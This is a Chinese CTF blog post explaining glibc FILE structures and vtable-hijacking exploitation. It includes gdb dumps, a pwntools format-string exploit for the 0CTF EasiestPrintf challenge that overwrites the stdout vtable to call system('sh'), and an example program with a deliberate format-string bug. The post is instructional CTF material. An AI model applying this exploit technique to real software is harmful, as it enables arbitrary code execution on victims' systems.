---
title: Pwn的FILE结构体
tags:
  - PWN
  - FILE
categories: []
date: 2017-04-14 10:27:39
---

## 前言

神tm的，我写了两个半小时的文章啊，就这么没了。就在我随手把浏览器关掉的时候意识到，“等等，我好像忘了什么东西”，果然。。没有断电保存功能的编辑器坑啊。。
(╯‵□′)╯︵┻━┻
(╯‵□′)╯︵┻━┻
(╯‵□′)╯︵┻━┻
好了回到FILE结构体这个问题上来。由于两次碰见这个东西了，意识到似乎比赛中开始多了起来，于是趁热学习下，提高自己的姿势水平。

## FILE结构体

首先我们知道linux中遵循“所有接口皆文件”的原则，输入输出做成了文件的形式。

以下所有关键词搜索命令为
`grep -rn "struct _IO_FILE {" --include="*.h" /usr/include`

其中`_IO_2_1_stdout_`的结构体如下：

`glibc-2.24/libio/libio.h`
```
extern struct _IO_FILE_plus _IO_2_1_stdin_;
extern struct _IO_FILE_plus _IO_2_1_stdout_;
extern struct _IO_FILE_plus _IO_2_1_stderr_;
```

我们查看`_IO_FILE_plus`的结构体定义
`/root/desktop/glibc-2.24/libio/libioP.h`
```
/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */

struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```
这里也解释了之所以下面加上函数指针，做成类似虚表的形式，是为了与C++的流兼容。

下面来查看两个关键结构`_IO_FILE`和`_IO_jump_t`：
`_IO_FILE`在`/usr/include/libio.h`中
```
struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

`_IO_jump_t`在`/root/desktop/glibc-2.24/libio/fileops.c`中
```
const struct _IO_jump_t _IO_file_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_new_file_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, _IO_new_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

再结合gdb查看内存能够得到更直观的理解：
```
wndbg> telescope 0xf771fd60 40
00:0000│   0xf771fd60 (_IO_2_1_stdout_) ◂— 0xfbad2887
01:0004│   0xf771fd64 (_IO_2_1_stdout_+4) —▸ 0xf771fda7 (_IO_2_1_stdout_+71) ◂— 0x7208700a
... ↓
08:0020│   0xf771fd80 (_IO_2_1_stdout_+32) —▸ 0xf771fda8 (_IO_2_1_stdout_+72) —▸ 0xf7720870 ◂— 0x0
09:0024│   0xf771fd84 (_IO_2_1_stdout_+36) ◂— 0x0
... ↓
0d:0034│   0xf771fd94 (_IO_2_1_stdout_+52) —▸ 0xf771f5a0 (_IO_2_1_stdin_) ◂— 0xfbad208b
0e:0038│   0xf771fd98 (_IO_2_1_stdout_+56) ◂— 0x1
0f:003c│   0xf771fd9c (_IO_2_1_stdout_+60) ◂— 0x0
10:0040│   0xf771fda0 (_IO_2_1_stdout_+64) ◂— 0xffffffff
11:0044│   0xf771fda4 (_IO_2_1_stdout_+68) ◂— 0xa000000
12:0048│   0xf771fda8 (_IO_2_1_stdout_+72) —▸ 0xf7720870 ◂— 0x0
13:004c│   0xf771fdac (_IO_2_1_stdout_+76) ◂— 0xffffffff
... ↓
15:0054│   0xf771fdb4 (_IO_2_1_stdout_+84) ◂— 0x0
16:0058│   0xf771fdb8 (_IO_2_1_stdout_+88) —▸ 0xf771f4e0 ◂— 0x0
17:005c│   0xf771fdbc (_IO_2_1_stdout_+92) ◂— 0x0
... ↓
1a:0068│   0xf771fdc8 (_IO_2_1_stdout_+104) ◂— 0xffffffff
1b:006c│   0xf771fdcc (_IO_2_1_stdout_+108) ◂— 0x0
... ↓
25:0094│   0xf771fdf4 (_IO_2_1_stdout_+148) —▸ 0xf771d960 (_IO_file_jumps) ◂— 0x0
26:0098│   0xf771fdf8 (stderr) —▸ 0xf771fcc0 (_IO_2_1_stderr_) ◂— 0xfbad2087
27:009c│   0xf771fdfc (stdout) —▸ 0xf771fd60 (_IO_2_1_stdout_) ◂— 0xfbad2887
pwndbg> telescope 0xf771d960 30
00:0000│   0xf771d960 (_IO_file_jumps) ◂— 0x0
... ↓
02:0008│   0xf771d968 (_IO_file_jumps+8) —▸ 0xf75d6040 (_IO_file_finish) ◂— push   edi
03:000c│   0xf771d96c (_IO_file_jumps+12) —▸ 0xf75d6b00 (_IO_file_overflow) ◂— push   ebp
04:0010│   0xf771d970 (_IO_file_jumps+16) —▸ 0xf75d6810 (_IO_file_underflow) ◂— push   ebp
05:0014│   0xf771d974 (_IO_file_jumps+20) —▸ 0xf75d7a40 (_IO_default_uflow) ◂— push   esi
06:0018│   0xf771d978 (_IO_file_jumps+24) —▸ 0xf75d8b50 (_IO_default_pbackfail) ◂— push   ebp
07:001c│   0xf771d97c (_IO_file_jumps+28) —▸ 0xf75d5c50 (_IO_file_xsputn) ◂— push   ebp
08:0020│   0xf771d980 (_IO_file_jumps+32) —▸ 0xf75d5790 ◂— push   ebp
09:0024│   0xf771d984 (_IO_file_jumps+36) —▸ 0xf75d4730 (_IO_file_seekoff) ◂— push   ebp
0a:0028│   0xf771d988 (_IO_file_jumps+40) —▸ 0xf75d7dd0 ◂— push   ebp
0b:002c│   0xf771d98c (_IO_file_jumps+44) —▸ 0xf75d44b0 (_IO_file_setbuf) ◂— push   esi
0c:0030│   0xf771d990 (_IO_file_jumps+48) —▸ 0xf75d4300 (_IO_file_sync) ◂— push   ebp
0d:0034│   0xf771d994 (_IO_file_jumps+52) —▸ 0xf75c93b0 (_IO_file_doallocate) ◂— push   ebp
0e:0038│   0xf771d998 (_IO_file_jumps+56) —▸ 0xf75d5c00 (_IO_file_read) ◂— push   esi
0f:003c│   0xf771d99c (_IO_file_jumps+60) —▸ 0xf75d55b0 (_IO_file_write) ◂— push   ebp
10:0040│   0xf771d9a0 (_IO_file_jumps+64) —▸ 0xf75d5210 (_IO_file_seek) ◂— push   ebx
11:0044│   0xf771d9a4 (_IO_file_jumps+68) —▸ 0xf75d4480 (_IO_file_close) ◂— push   ebx
12:0048│   0xf771d9a8 (_IO_file_jumps+72) —▸ 0xf75d5590 (_IO_file_stat) ◂— sub    esp, 0x10
13:004c│   0xf771d9ac (_IO_file_jumps+76) —▸ 0xf75d8ce0 ◂— mov    eax, 0xffffffff
14:0050│   0xf771d9b0 (_IO_file_jumps+80) —▸ 0xf75d8cf0 ◂— ret    
```

## 利用原理

我们平时调用文件族的函数的时候（包括一些输入输出），最后都会通过虚表来调用函数，如果我们可以通过修改`signed char _vtable_offset`使其指向一个我们伪造的虚表，那么我们就可以控制eip。

利用思路：
1. 控制`_IO_FILE_plus`或`_IO_FILE`结构体的`signed char _vtable_offset`偏移使其指向我们伪造的虚表。
2. 伪造虚表中函数为我们希望程序调用的函数如`system`

利用条件：
1. 可泄露`libc`基址
2. 有一次任意地址写的机会
3. 存在一个我们知道地址的可控区域

## 例题

下面用20170ctf的Easyprintf来为例分析

> 程序在进行一次任意地址读之后有一次格式化字符串的机会，之后直接exit。在程序启用Full RELRO的情况下，选择覆盖libc中的`_IO_2_1_stdout_`结构的虚表，因为`printf`在将所有输入解析之后会调用其中的某个函数进行输出，我们可以其改为`system`，而这个结构自身会作为参数传入，覆盖虚表之后将一个`sh\0\0`写到整个结构头部即可。

先放上没什么卵用但是应该是对的并且学到了东西的exp。。。。
```
#!/usr/bin/env python
# coding=utf-8
from pwn import *

slog = 1
local = 1
debug = 0

global p

if slog: context(log_level = 'debug')
if local:
    p = process('./EasiestPrintf')
else:
    p = remote()

if local and debug:
    gdb.attach(p, open('debug'))

elf = ELF('./EasiestPrintf')
libc = ELF('/lib32/libc.so.6')
bss_addr = elf.bss
_IO_stdout_got = 0x0804A044

'''
def exe_fmt(payload):
    p = process('./EasiestPrintf')
    p.recvuntil('read:\n')
    p.sendline(str(_IO_stdout_addr))
    p.recvuntil('Good Bye\n')
    p.sendline(payload)
    return p.recvall()
'''
def pwn():
    p.recvuntil('read:\n')
    p.sendline(str(_IO_stdout_got))
    _IO_stdout_addr = int(p.recvline(), 16)
    p.recvline('Good Bye\n')
    print '_IO_stdout_addr => ', hex(_IO_stdout_addr)
    libc.address = _IO_stdout_addr - libc.symbols['_IO_2_1_stdout_']
    system_addr = libc.symbols['system']
    print 'system_addr => ', hex(system_addr)
    _IO_file_jumps_addr = libc.symbols['_IO_file_jumps']
    print '_IO_file_jumps => ', hex(libc.symbols['_IO_file_jumps'])
#    gdb.attach(p, open('debug'))
    
    def exe_fmt(payload):
        p = process('./EasiestPrintf')
        p.recvuntil('read:\n')
        p.sendline(str(_IO_stdout_got))
        p.recvuntil('Good Bye\n')
        p.sendline(payload)
        return p.recvall()
    fmt = FmtStr(exe_fmt)  # init
    # _IO_stdout_addr = 'sh\x00\x00'
    # _IO_stdout_addr - 4 = &system
    # _IO_stdout_vtable+0x1c = &(libc_stdout-4)       _IO_file_xsputn
    writes = {_IO_stdout_addr:26739-16, # 'sh\x00\x00'
            _IO_stdout_addr-4:system_addr,
            _IO_file_jumps_addr+0x1c:_IO_stdout_addr-4}
    payload = fmtstr_payload(fmt.offset, writes, 0, 'byte')
    p.sendline(payload)
    
if __name__ == '__main__':
    pwn()
    p.interactive()
```
最后的payload使180长度，但是最大长度是158- -。。

## 关于FmtStr

pwntools中的fmtstr还是很有趣的，唯一的不足就是生成的payload太长了- -因为据观察完全是用`hhn`来修改的（因为只能指定一个只能为`hhn`or`hn`or`n`中的一种来生成payload），大概是作者懒了没想设计别的算法把- -

先看下给出的example
```
>>> program = tempfile.mktemp()
>>> source  = program + ".c"
>>> write(source, '''
... #include <stdio.h>
... #include <stdlib.h>
... #include <unistd.h>
... #include <sys/mman.h>
... #define MEMORY_ADDRESS ((void*)0x11111000)
... #define MEMORY_SIZE 1024
... #define TARGET ((int *) 0x11111110)
... int main(int argc, char const *argv[])
... {
...        char buff[1024];
...        void *ptr = NULL;
...        int *my_var = TARGET;
...        ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
...        if(ptr != MEMORY_ADDRESS)
...        {
...                perror("mmap");
...                return EXIT_FAILURE;
...        }
...        *my_var = 0x41414141;
...        write(1, &my_var, sizeof(int *));
...        scanf("%s", buff);
...        dprintf(2, buff);
...        write(1, my_var, sizeof(int));
...        return 0;
... }''')
>>> cmdline = ["gcc", source, "-Wno-format-security", "-m32", "-o", program]
>>> process(cmdline).wait_for_close()
>>> def exec_fmt(payload):
...     p = process(program)
...     p.sendline(payload)
...     return p.recvall()
...
>>> autofmt = FmtStr(exec_fmt)
>>> offset = autofmt.offset
>>> p = process(program, stderr=PIPE)
>>> addr = unpack(p.recv(4))
>>> payload = fmtstr_payload(offset, {addr: 0x1337babe})
>>> p.sendline(payload)
>>> print hex(unpack(p.recv(4)))
0x1337babe
```

主要就是一个类，一个函数：
`class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)`
`pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') → str`

其中上面的那个类可以用来完成fsb的所有操作，下面那个方法主要是用来产生payload用。
+ execute_fmt 一个存在fsb的process，我们通过这个process的交互过程来得到fsb的一些基本信息
+ offset 偏移，没有给出的话会通过栈泄露自动给出
+ padlen payload之前填充的字符数
+ numbwritem 生成的此payload（包括填充）之前的偏移量

看了看源码，发现`成员名`和`参数名`是同名的，直接调用即可。我们其实可以主要用这个来得到`FmtStr.offset`即可。
实例化一个类后，通过`write(addr, data) `来控制想要修改的地址和数据，可以通过一个字典来传参**（data(int)）**。
最后通过`execute_writes() `方法来调用`fmtstr_payload`生成payload并发送出去。

我们也可以直接调用`fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')`这个方法来只生成payload。
给下参数，没啥特别的
+ offset (int) – the first formatter’s offset you control
+ writes (dict) – dict with addr, value {addr: value, addr2: value2}
+ numbwritten (int) – number of byte already written by the printf function
+ write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)